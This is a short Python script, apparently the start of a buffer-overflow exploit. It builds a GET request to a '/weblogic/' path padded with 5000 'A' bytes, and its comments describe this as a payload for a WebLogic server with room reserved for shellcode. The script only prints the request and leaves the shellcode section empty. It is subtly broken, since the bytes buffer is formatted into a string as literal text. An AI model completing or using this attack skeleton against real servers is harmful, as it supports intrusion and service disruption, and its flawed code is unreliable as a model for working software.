import os
import socket

#This is the area for the shell code which will be put inside the buffer. 


#This variable is essentially the payload that will be sent to the weblogic server
buf = b"A" * 5000

#HTTP GET request
request = f"GET /weblogic/{buf}\r\n\r\n"

#Print the function and use it in the terminal
print(request)
